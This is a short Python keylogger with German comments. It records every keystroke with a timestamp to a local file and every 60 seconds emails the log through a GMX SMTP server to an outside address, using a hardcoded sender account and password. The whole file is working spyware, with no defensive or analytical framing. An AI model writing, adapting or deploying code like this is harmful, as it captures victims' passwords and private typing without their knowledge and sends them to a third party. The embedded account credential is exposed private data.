import keyboard
from datetime import datetime
import ctypes
import os
import sys
import smtplib
import schedule
import time


def on_key(event):
    key = event.name
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('keylog.txt', 'a') as f:
        f.write(f"[{timestamp}] Key: {key}\n")

keyboard.on_press(on_key)

def send_email():
    from_addr = 'rickroll1@gmx.de'  # deine E-Mail-Adresse
    to_addr = 'emil.sonnenschein@t-online.de'    # die Ziel-E-Mail-Adresse
    subject = 'Keylogs'   # Betreff der E-Mail
    body = ''                              # Inhalt der E-Mail

    # Öffne die Datei mit den geloggten Tasteneingaben und lies den Inhalt
    with open('keylog.txt', 'r') as f:
        body = f.read()

    # SMTP-Verbindung herstellen und E-Mail senden
    try:
        server = smtplib.SMTP('mail.gmx.net', 587)
        server.starttls()
        server.login(from_addr, 'IchHabeDeineDaten@2024Nr2')  # Dein E-Mail-Passwort
        msg = f"From: {from_addr}\nTo: {to_addr}\nSubject: {subject}\n\n{body}"
        server.sendmail(from_addr, to_addr, msg)
        server.quit()
        print('E-Mail erfolgreich gesendet!')
    except Exception as e:
        print(f"Fehler beim Senden der E-Mail: {e}")

# Plane das Senden der E-Mail alle 60 Sekunden
schedule.every(60).seconds.do(send_email)

# Starte die Jobplanung
while True:
    schedule.run_pending()
    time.sleep(1)